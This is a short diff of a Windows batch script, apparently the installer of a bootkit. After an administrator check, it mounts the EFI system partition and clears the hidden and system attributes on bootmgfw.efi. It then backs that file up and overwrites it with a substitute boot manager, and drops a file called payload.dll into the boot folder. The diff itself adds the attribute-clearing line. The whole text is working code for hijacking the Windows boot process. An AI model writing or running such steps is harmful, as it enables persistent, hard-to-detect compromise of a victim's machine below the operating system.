@@ -2,6 +2,7 @@
 net session >nul 2>&1
 if %errorLevel% == 0 (
     mountvol X: /S
+    attrib -s -h X:\EFI\Microsoft\Boot\bootmgfw.efi
     move X:\EFI\Microsoft\Boot\bootmgfw.efi X:\EFI\Microsoft\Boot\bootmgfw.efi.backup
     xcopy %~dp0bootmgfw.efi X:\EFI\Microsoft\Boot\
     xcopy %~dp0payload.dll  X:\EFI\Microsoft\Boot\
